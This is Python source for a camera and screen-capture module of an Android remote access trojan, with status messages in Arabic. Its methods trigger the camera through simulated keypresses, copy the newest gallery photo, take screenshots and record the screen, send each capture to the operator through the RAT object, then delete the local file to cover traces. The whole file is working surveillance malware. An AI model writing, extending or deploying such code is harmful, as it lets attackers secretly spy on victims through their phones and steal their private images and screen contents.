import os, time, subprocess

class CameraController:
    def __init__(self, rat_instance):
        self.rat = rat_instance

    def take_photo(self, camera_id: int = 0) -> str:
        label = "أمامية" if camera_id else "خلفية"
        path = f"/sdcard/photo_rat_{camera_id}.jpg"
        facing = f"--ei android.intent.extras.CAMERA_FACING {camera_id}"
        try:
            os.system(f"am start -a android.media.action.IMAGE_CAPTURE {facing} 2>/dev/null")
            time.sleep(3)
            os.system("input keyevent 66 2>/dev/null")
            time.sleep(2)
            os.system("input keyevent 66 2>/dev/null")
            time.sleep(1)
            os.system("input keyevent 4 2>/dev/null")
            found = self._find_latest(path)
            if found and os.path.exists(path) and os.path.getsize(path) > 100:
                sent = self.rat.send_photo(path, f"📷 {label}")
                os.system(f"rm -f {path}")
                return f"✅ {label}" if sent else "⚠️ تم التصوير لكن فشل الإرسال"
            return f"❌ فشل {label}"
        except Exception as e:
            return f"❌ {e}"

    def _find_latest(self, dest: str) -> bool:
        dcim = ["/sdcard/DCIM/Camera", "/sdcard/DCIM/Screenshots", "/sdcard/DCIM", "/sdcard/Pictures"]
        files_found = []
        for folder in dcim:
            if os.path.exists(folder):
                try:
                    for f in os.listdir(folder):
                        if f.lower().endswith(('.jpg','.jpeg','.png')):
                            fp = os.path.join(folder, f)
                            files_found.append((os.path.getmtime(fp), fp))
                except:
                    pass
        if files_found:
            files_found.sort(key=lambda x: x[0], reverse=True)
            os.system(f"cp '{files_found[0][1]}' {dest} 2>/dev/null")
            return True
        return False

    def take_screenshot(self) -> str:
        path = "/sdcard/screenshot_rat.png"
        try:
            os.system(f"screencap -p {path} 2>/dev/null")
            time.sleep(1.5)
            if os.path.exists(path) and os.path.getsize(path) > 100:
                sent = self.rat.send_photo(path, "📸 لقطة شاشة")
                os.system(f"rm -f {path}")
                return "✅ لقطة شاشة" if sent else "⚠️ التقطت لكن فشل الإرسال"
            return "❌ فشل"
        except Exception as e:
            os.system(f"rm -f {path}")
            return f"❌ {e}"

    def record_screen(self, duration: int = 10) -> str:
        if duration > 60:
            duration = 60
        path = "/sdcard/screenrecord_rat.mp4"
        try:
            os.system(f"screenrecord --time-limit {duration} {path} 2>/dev/null &")
            time.sleep(duration + 2)
            if os.path.exists(path) and os.path.getsize(path) > 1024:
                sent = self.rat.send_file(path, f"🎥 {duration} ثانية")
                os.system(f"rm -f {path}")
                return f"✅ {duration} ثانية" if sent else "⚠️ سجل لكن فشل الإرسال"
            return "❌ فشل"
        except Exception as e:
            os.system(f"rm -f {path}")
            return f"❌ {e}"
